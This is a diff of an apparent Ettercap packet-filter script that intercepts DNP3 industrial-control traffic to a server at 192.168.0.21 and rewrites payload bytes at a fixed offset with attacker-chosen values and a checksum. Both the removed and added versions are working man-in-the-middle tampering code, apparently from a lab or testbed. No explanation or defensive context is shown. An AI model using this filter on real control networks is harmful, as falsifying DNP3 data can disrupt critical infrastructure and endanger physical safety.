@@ -9,14 +9,16 @@
 
 # Checking to see if the destination is the server and the protocol is DNP3
 # Note: The IP address will need to be updated for your server
-if (ip.dst == '192.168.0.21' && tcp.src == 20000) {
+if (ip.dst == '192.168.0.21') {
+    if (tcp.src == 20000) {
 
-	# Check for DNP3 message and a DNP3 data with length 37. 
-    if (DATA.data == "\x05\x64" && DATA.data + 2 == "\x25"){
-        # Overwrite DNP3 packet data
-        DATA.data + 28 = "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xc3\xbb";
-    	# Printing a message when the filter fires.
-    	msg("Updated DNP3 data with \x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xc3\xbb");
+        # Check for DNP3 message and a DNP3 data with length 37. 
+        if (DATA.data == "\x05\x64\x65\x44"){
+            # Overwrite DNP3 packet data
+            DATA.data + 28 = "\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xc3\xbb";
+            # Printing a message when the filter fires.
+            msg("Updated DNP3 data with \x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xc3\xbb");
+        }
     }
 }
 
